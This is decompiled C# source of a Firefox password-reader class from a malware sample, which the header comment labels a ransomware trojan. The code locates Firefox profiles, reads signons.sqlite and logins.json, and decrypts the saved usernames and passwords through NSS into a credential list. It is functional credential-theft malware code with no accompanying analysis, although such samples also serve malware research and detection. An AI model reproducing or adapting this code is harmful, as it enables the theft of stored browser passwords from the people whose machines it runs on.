// Decompiled with JetBrains decompiler
// Type: pazuzu.FirefoxPassReader
// Assembly: Private, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 345B90E2-2B0E-4FAF-8906-CB0787A05498
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-5dc3085c70289a9a4a0699d883af744e8777d3b9bbe07de15e4087bcce71d3d9.exe

using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Data.Common;
using System.Data.SQLite;
using System.IO;

namespace pazuzu
{
  internal class FirefoxPassReader : IPassReader
  {
    public string BrowserName => "Firefox";

    public IEnumerable<CredentialModel> ReadPasswords()
    {
      string str1 = (string) null;
      string path = (string) null;
      bool flag1 = false;
      bool flag2 = false;
      string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
      List<CredentialModel> credentialModelList = new List<CredentialModel>();
      if (directories.Length == 0)
        return (IEnumerable<CredentialModel>) credentialModelList;
      foreach (string str2 in directories)
      {
        string[] files1 = Directory.GetFiles(str2, "signons.sqlite");
        if (files1.Length != 0)
        {
          str1 = files1[0];
          flag1 = true;
        }
        string[] files2 = Directory.GetFiles(str2, "logins.json");
        if (files2.Length != 0)
        {
          path = files2[0];
          flag2 = true;
        }
        if (flag2 | flag1)
        {
          FFDecryptor.NSS_Init(str2);
          break;
        }
      }
      if (flag1)
      {
        using (SQLiteConnection sqLiteConnection = new SQLiteConnection("Data Source=" + str1 + ";"))
        {
          ((DbConnection) sqLiteConnection).Open();
          using (SQLiteCommand command = sqLiteConnection.CreateCommand())
          {
            ((DbCommand) command).CommandText = "SELECT encryptedUsername, encryptedPassword, hostname FROM moz_logins";
            using (SQLiteDataReader sqLiteDataReader = command.ExecuteReader())
            {
              while (((DbDataReader) sqLiteDataReader).Read())
              {
                string str3 = FFDecryptor.Decrypt(((DbDataReader) sqLiteDataReader).GetString(0));
                string str4 = FFDecryptor.Decrypt(((DbDataReader) sqLiteDataReader).GetString(1));
                credentialModelList.Add(new CredentialModel()
                {
                  Username = str3,
                  Password = str4,
                  Url = ((DbDataReader) sqLiteDataReader).GetString(2)
                });
              }
            }
          }
          ((DbConnection) sqLiteConnection).Close();
        }
      }
      if (flag2)
      {
        FirefoxPassReader.FFLogins ffLogins;
        using (StreamReader streamReader = new StreamReader(path))
          ffLogins = JsonConvert.DeserializeObject<FirefoxPassReader.FFLogins>(streamReader.ReadToEnd());
        foreach (FirefoxPassReader.LoginData login in ffLogins.logins)
        {
          string str5 = FFDecryptor.Decrypt(login.encryptedUsername);
          string str6 = FFDecryptor.Decrypt(login.encryptedPassword);
          credentialModelList.Add(new CredentialModel()
          {
            Username = str5,
            Password = str6,
            Url = login.hostname
          });
        }
      }
      return (IEnumerable<CredentialModel>) credentialModelList;
    }

    private class FFLogins
    {
      public long nextId { get; set; }

      public FirefoxPassReader.LoginData[] logins { get; set; }

      public string[] disabledHosts { get; set; }

      public int version { get; set; }
    }

    private class LoginData
    {
      public long id { get; set; }

      public string hostname { get; set; }

      public string url { get; set; }

      public string httprealm { get; set; }

      public string formSubmitURL { get; set; }

      public string usernameField { get; set; }

      public string passwordField { get; set; }

      public string encryptedUsername { get; set; }

      public string encryptedPassword { get; set; }

      public string guid { get; set; }

      public int encType { get; set; }

      public long timeCreated { get; set; }

      public long timeLastUsed { get; set; }

      public long timePasswordChanged { get; set; }

      public long timesUsed { get; set; }
    }
  }
}
